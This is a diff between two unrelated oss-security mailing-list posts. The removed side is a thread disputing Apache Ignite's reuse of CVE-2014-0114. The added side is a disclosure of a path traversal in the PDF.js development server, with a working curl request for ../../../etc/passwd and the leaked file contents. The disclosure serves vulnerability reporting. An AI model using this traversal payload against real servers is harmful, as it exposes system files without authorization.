@@ -1,168 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/06/2
-Message-ID: <CAK0qHnpaLFap2tdujYok1DkRg9PNDXtaxBpO2CY6saSOsnsyZg@mail.gmail.com>
-Date: Wed, 6 Jun 2018 09:08:33 -0700
-From: Denis Magda <dmagda@...che.org>
-To: Tomas Hoger <thoger@...hat.com>
-Cc: oss-security@...ts.openwall.com, dev <dev@...ite.apache.org>,  "Rai, Harendra" <harendra.rai@....com>
-Subject: Re: [CVE-2014-0114]: Apache Ignite is vulnerable to existing CVE-2014-0114
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/24/3
+Message-ID: <CAG8b5tTuLM-jHfWRz1Cvi9K_OAbn7h5EHGh2xicR2YR7Nr45Gw@mail.gmail.com>
+Date: Sat, 24 Nov 2018 13:16:49 +0530
+From: Dhiraj Mishra <mishra.dhiraj95@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Path traversal in mozilla PDF.js [Unpatched]
 Content-Type: text/plain; charset=utf-8
 
-Hello Tomas,
+## Summary
+A path traversal issue was observed in Mozilla PDF.js which is a PDF reader
+in JavaScript. This issue was observed while code review of PDF.js
+(gulpfile.js)(
+https://github.com/mozilla/pdf.js/blob/master/gulpfile.js#L1023), Mozilla
+team says "The server with pdf.js is intended to be a development server
+and should not be exposed to public networks. I suppose we could update the
+docs to state that." and a upstream bug was filed against the same (
+https://github.com/mozilla/pdf.js/issues/10249).
 
-We've just updated the version of Binutils because Ignite doesn't use this
-library directly. So we don't need to inject addBeanIntrospector call.
+## Installation
+PDF.js is built into version 19+ of firefox and a chrome extension is also
+available on chrome web store. To install and get a local copy of PDF.js
+here are the below steps :
+$ git clone https://github.com/mozilla/pdf.js.git
+$ cd pdf.js
+$ npm install -g gulp-cli
+$ npm install
+$ gulp server
 
-Binutils are used by some dependencies like Cassandra. Let us confirm that
-the dependencies shouldn't be upgraded.
+##Exploitation
+I've used the attribute --path-as-is from cURL to verify this issue.
+$ curl --path-as-is -v http://127.0.0.1:8888/../../../../../../etc/passwd
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8888 (#0)
+> GET /../../../../../../etc/passwd HTTP/1.1
+> Host: 127.0.0.1:8888
+> User-Agent: curl/7.58.0
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Accept-Ranges: bytes
+< Content-Type: application/octet-stream
+< Content-Length: 2745
+< Date: Thu, 15 Nov 2018 06:34:32 GMT
+< Connection: keep-alive
+<
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
 
---
-Denis
 
-On Wed, Jun 6, 2018 at 4:33 AM, Tomas Hoger <thoger@...hat.com> wrote:
-
-> Hi Denis!
->
-> On Fri, 1 Jun 2018 10:16:50 -0700 Denis Magda wrote:
->
-> > [CVE-2014-0114]: Apache Ignite is vulnerable to existing CVE-2014-0114
-> >
-> > Severity: Important
-> >
-> > Vendor: The Apache Software Foundation
-> >
-> > Versions Affected: Apache Ignite 2.4 or earlier
-> >
-> > Impact:
-> > An attacker can execute arbitrary code on Ignite nodes in the case
-> > when Ignite classpath contains arbitrary vulnerable classes.
-> >
-> > Description:
-> > Apache Ignite used commons-beanutils-1.8.3.jar library which did not
-> > suppress the class property, which allowed remote attackers to
-> > "manipulate" the ClassLoader and execute arbitrary code via the class
-> > parameter, as demonstrated by the passing of this parameter to the
-> > getClass method of the ActionForm object in Struts 1.
->
-> This announcement is very light on details.  Would it be possible to
-> provide more details, ideally a link to the fix that was applied to
-> address this issue?
->
-> Searching for more information, I found out that the upstream Jira
-> ticket for this issue should be:
->
-> https://issues.apache.org/jira/browse/IGNITE-8472
->
-> The ticket is non-public, but its content is leaked via a mailing list:
->
-> https://www.mail-archive.com/search?l=issues%40ignite.
-> apache.org&q=subject%3AIGNITE-8472
->
-> This has some important info, indicating that the problem (only?)
-> affects Ignite for .NET.  The reported problem basically seems to be:
-> Ignite for .NET bundles commons-beanutils 1.8.3 and that should be
-> upgraded to 1.9.2.  Looking into apache.ignite.2.4.0.nupkg and
-> apache.ignite.2.5.0.nupkg, I can see that commons-beanutils upgrade as
-> requested did happen in 2.5.0.
->
-> Note that I do not see any commons-beanutils jar in
-> apache-ignite-fabric-2.4.0-bin.zip and
-> apache-ignite-fabric-2.5.0-bin.zip.  Are those, as well as source
-> distribution, considered unaffected?
->
-> Now back to the CVE - I do not believe that your re-use of the old
-> CVE-2014-0114 is correct.  In the report, there was some ambiguity
-> whether Struts or Commons-BeanUtils should be blamed for the flaw,
-> however it seems to be explicit enough that the CVE-2014-0114 is for
-> Struts:
->
-> http://openwall.com/lists/oss-security/2014/06/15/10
->
-> As noted in the mail, the problem wasn't fixed in Commons-BeanUtils,
-> which only added mechanisms to make it easy for applications using
-> Commons-BeanUtils to easily disable processing of the "class"
-> property.  It did not even disable processing by default, as noted in
-> the release notes:
->
-> http://commons.apache.org/proper/commons-beanutils/
-> javadocs/v1.9.2/RELEASE-NOTES.txt
->
-> """
-> Release 1.9.2 mainly addresses a potential security issue when accessing
-> properties in an uncontrolled way. In a nutshell, if an application that
-> uses
-> Commons BeanUtils passes property paths from an external source directly to
-> the getProperty() method of BeanUtilsBean, an attacker can access the class
-> loader via the class property available on all Java objects.
->
-> In version 1.9.2 now a special BeanIntrospector class was added which
-> allows
-> suppressing this property. Note that this BeanIntrospector is NOT enabled
-> by
-> default! Commons BeanUtils is a low-level library, and on this layer it
-> cannot
-> be decided whether access to a certain property is legal or not. Therefore,
-> an application has to activate this suppressing BeanIntrospector
-> explicitly.
-> This can be done with the following lines of code:
->
-> BeanUtilsBean bub = new BeanUtilsBean();
-> bub.getPropertyUtils().addBeanIntrospector(
->     SuppressPropertiesBeanIntrospector.SUPPRESS_CLASS);
->
-> Now all access to properties has to be done via the specially configured
-> BeanUtilsBean instance. More information about this issue can be found at
-> https://issues.apache.org/jira/browse/BEANUTILS-463 or in section 2.5
-> of the user's guide.
-> """
->
-> Note that there was a request to assign a separate CVE for the
-> BeanUtils part that was rejected (actually, CVE-2014-3540 was assigned
-> and later rejected), see this post from Mitre for details:
->
-> http://openwall.com/lists/oss-security/2014/07/08/1
->
-> It has few parts that are relevant to Ignite:
->
-> """
-> In particular, the 1597344 change has this documentation:
->
->    Adding this instance as BeanIntrospector to an instance of
->    PropertyUtilsBean suppresses the class property; it can then no
->    longer be accessed.
->
-> This is an additional step that would need to be followed for any
-> currently shipped product that relies on commons-beanutils. Simply
-> picking up version 1.9.2 does not solve the problem. The product's
-> source code must additionally be modified by (for example) changing
-> or adding an addBeanIntrospector method call.
-> """
->
-> Did Ignite get any other changes related to this issue apart from
-> upgrading Commons-BeanUtils?  If not, Commons-BeanUtils upgrade should
-> not be expected to solve the problem (if Ignite actually was affected /
-> used Commons-BeanUtils in a vulnerable way, which isn't demonstrated in
-> the IGNITE-8472).
->
-> Another relevant part is:
->
-> """
-> If any other product makes a security announcement that they have
-> added
-> addBeanIntrospector(SuppressPropertiesBeanIntrospector.SUPPRESS_CLASS)
-> or equivalent code as a change to the default behavior, then there can
-> be an individual CVE ID for that product. However, if any other product
-> simply makes a security announcement that they have decided to ship
-> commons-beanutils 1.9.2 -- but the class property remains exposed in
-> the product as it is shipped and installed by default -- then a CVE ID
-> would not be assigned.
-> """
->
-> If Ignite got/gets a fix that leverages the SUPPRESS_CLASS from
-> Commons-BeanUtils 1.9.2 to disable processing of the class property, it
-> should get its own CVE assigned.
->
-> --
-> Tomas Hoger / Red Hat Product Security
->
+Thank you
+Dhiraj (@mishradhiraj_)
 
